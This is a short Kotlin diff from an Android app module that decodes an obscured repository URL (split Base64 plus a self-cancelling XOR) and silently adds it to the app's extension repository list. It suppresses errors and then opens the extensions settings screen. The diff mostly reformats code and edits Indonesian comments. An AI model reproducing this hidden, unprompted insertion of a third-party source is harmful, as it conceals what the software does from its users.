@@ -30,7 +30,9 @@ object ObscuraIngress {
         val encoded = p1 + p2 + p3 + p4 + p5 + p6
         val decoded = String(Base64.decode(encoded, Base64.DEFAULT))
         val key = 0x12
-        return decoded.map { (it.code xor key).toChar() }.map { (it.code xor key).toChar() }.joinToString("")
+        return decoded.map { (it.code xor key).toChar() }
+            .map { (it.code xor key).toChar() }
+            .joinToString("")
     }
 
     private val REPO_URL by lazy { decodeRepoUrl() }
@@ -39,7 +41,7 @@ object ObscuraIngress {
     fun install(activity: Activity) {
         CoroutineScope(Dispatchers.IO).launch {
             try {
-                // HANYA tambah repo ke list, tidak auto-download
+                // ✅ Hanya tambah repo jika belum ada
                 if (RepositoryManager.getRepositories().none { it.url == REPO_URL }) {
                     RepositoryManager.addRepository(
                         RepositoryData(
@@ -50,10 +52,10 @@ object ObscuraIngress {
                     )
                 }
             } catch (_: Throwable) {
-                // silent
+                // silent, jangan crash
             }
 
-            // UI ONLY — user pilih download manual
+            // ✅ UI — navigasi ke settings extensions, user download manual
             withContext(Dispatchers.Main) {
                 activity.navigate(
                     R.id.action_navigation_global_to_navigation_settings_extensions
